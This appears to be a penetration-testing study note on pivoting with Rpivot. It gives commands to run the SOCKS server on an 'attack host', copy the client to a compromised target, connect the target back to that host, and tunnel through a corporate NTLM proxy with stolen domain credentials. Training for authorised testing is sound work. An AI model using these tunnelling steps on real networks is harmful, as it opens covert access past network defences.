---
tags:
  - Exploitation
  - Tunnelling
  - Tooling
  - SSHTunnelling
---
[Rpivot](https://github.com/klsecservices/rpivot) is a reverse SOCKS proxy tool written in Python for SOCKS tunnelling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side.

![[77.webp]]

We can start our rpivot SOCKS proxy server using the below command to allow the client to connect on port 9999 and listen on port 9050 for proxy pivot connections.

### Install Rpivot

```shell-session
git clone https://github.com/klsecservices/rpivot.git
```


```shell-session
sudo apt-get install python2.7
```

### Usage

#### Running server.py from the Attack Host

```shell-session
python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

Before running `client.py` we will need to transfer Rpivot to the target. We can do this using this SCP command:

```shell-session
scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/
```

#### Running client.py from Pivot Target

```shell-session
python2.7 client.py --server-ip 10.10.14.18 --server-port 9999
```

We will configure proxychains to pivot over our local server on 127.0.0.1:9050 on our attack host, which was initially started by the Python server.

 Some organizations have [HTTP-proxy with NTLM authentication](https://docs.microsoft.com/en-us/openspecs/office_protocols/ms-grvhenc/b9e676e7-e787-4020-9840-7cfe7c76044a) configured with the Domain Controller. In such cases, we can provide an additional NTLM authentication option to Rpivot to authenticate via the NTLM proxy by providing a username and password. In these cases, we could use Rpivot's client.py in the following way:

#### Connecting to a Web Server using HTTP-Proxy & NTLM Auth

```shell-session
python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>
```





